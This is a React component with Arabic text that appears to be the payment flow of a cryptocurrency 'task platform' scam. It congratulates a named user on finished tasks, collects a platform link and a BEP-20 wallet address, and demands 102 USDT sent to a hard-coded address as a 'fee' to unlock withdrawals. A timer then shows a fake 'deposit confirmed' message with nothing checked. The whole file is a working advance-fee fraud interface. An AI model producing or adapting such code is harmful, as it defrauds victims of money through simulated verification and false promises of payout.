
import React, { useState, useEffect } from 'react';

interface TaskModalProps {
  onClose: () => void;
}

const TaskModal: React.FC<TaskModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [miniProLink, setMiniProLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');
  const [isVerifying, setIsVerifying] = useState(true);

  const nextStep = () => setStep(step + 1);

  // Handle the 10-second verification timer when step 4 is reached
  useEffect(() => {
    if (step === 4) {
      const timer = setTimeout(() => {
        setIsVerifying(false);
      }, 10000);
      return () => clearTimeout(timer);
    }
  }, [step]);

  const containerStyle = "fixed inset-0 z-[100] flex items-center justify-center p-6 bg-black/40 backdrop-blur-[2px]";
  const cardStyle = "bg-white rounded-2xl w-full max-w-[340px] shadow-2xl overflow-hidden text-right p-6 flex flex-col items-center animate-in fade-in zoom-in duration-300";
  const buttonStyle = "w-full bg-[#3177f1] text-white py-3 rounded-xl font-bold mt-4 active:scale-95 transition-transform";
  const inputStyle = "w-full border border-gray-200 rounded-xl px-4 py-3 mt-4 text-center focus:outline-none focus:ring-2 focus:ring-[#3177f1]/50 text-sm";

  return (
    <div className={containerStyle} dir="rtl">
      <div className={cardStyle}>
        {step === 1 && (
          <>
            <i className="fa-solid fa-circle-check text-green-500 text-5xl mb-4"></i>
            <h2 className="text-xl font-bold text-gray-800 mb-4 text-center">أهلاً بك Mahmoud9639</h2>
            <p className="text-gray-600 text-center leading-relaxed">
              تم حل أمر المهام، اضغط التالي وقم بوضع رابط المنصة <span className="font-bold text-blue-600">mini pro</span> لقسم الإيداع حصراً.
            </p>
            <input 
              type="text" 
              placeholder="رابط منصة mini pro (قسم الإيداع)"
              className={inputStyle}
              value={miniProLink}
              onChange={(e) => setMiniProLink(e.target.value)}
            />
            <button onClick={nextStep} className={buttonStyle}>التالي</button>
          </>
        )}

        {step === 2 && (
          <>
            <i className="fa-solid fa-wallet text-[#3177f1] text-5xl mb-4"></i>
            <h2 className="text-xl font-bold text-gray-800 mb-2">رابط المحفظة</h2>
            <p className="text-gray-600 text-center">يرجى وضع رابط محفظة BEP-20 الخاصة بك</p>
            <input 
              type="text" 
              placeholder="رابط محفظة BEP-20"
              className={inputStyle}
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
            />
            <button onClick={nextStep} className={buttonStyle}>التالي</button>
          </>
        )}

        {step === 3 && (
          <>
            <i className="fa-solid fa-circle-info text-orange-400 text-5xl mb-4"></i>
            <h2 className="text-lg font-bold text-gray-800 mb-3 text-center">أهلاً بك Mahmoud9639</h2>
            <p className="text-gray-600 text-sm text-center leading-relaxed mb-4">
              بقي أمر إيداع مبلغ <span className="font-bold text-red-600">102 عملة USDT BEP-20</span> لفتح قناة السحب. 
              هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
            </p>
            <div className="bg-gray-50 p-3 rounded-lg border border-dashed border-gray-300 w-full mb-2">
              <p className="text-[10px] text-gray-400 text-center mb-1 font-sans">USDT BEP-20 ADDRESS</p>
              <p className="text-[11px] font-mono text-center break-all text-gray-800 select-all">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</p>
            </div>
            <button onClick={nextStep} className={buttonStyle}>تم الإيداع</button>
          </>
        )}

        {step === 4 && (
          <div className="flex flex-col items-center animate-in fade-in duration-500">
            {isVerifying ? (
              <>
                <div className="w-12 h-12 border-4 border-[#3177f1] border-t-transparent rounded-full animate-spin mb-4 mt-4"></div>
                <h2 className="text-lg font-bold text-gray-800 mb-2 text-center">الرجاء الانتظار</h2>
                <p className="text-gray-600 text-center pb-6">جاري التأكد من عملية الإيداع، يرجى عدم إغلاق هذه الصفحة...</p>
              </>
            ) : (
              <>
                <i className="fa-solid fa-circle-check text-green-500 text-6xl mb-4 mt-4"></i>
                <h2 className="text-xl font-bold text-gray-800 mb-3 text-center">تم التأكد</h2>
                <div className="bg-blue-50 p-4 rounded-xl border border-blue-100">
                  <p className="text-gray-700 text-sm text-center leading-loose">
                    سيتم فتح قناة السحب خلال <span className="font-bold">48 ساعة</span>. 
                    قم بالرجوع كل ساعة للتأكد. 
                    ستختفي هذه الرسالة عند فتح قناة السحب تلقائياً.
                  </p>
                </div>
                <p className="text-[10px] text-gray-400 mt-6 text-center">النظام في انتظار التحديث النهائي...</p>
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default TaskModal;
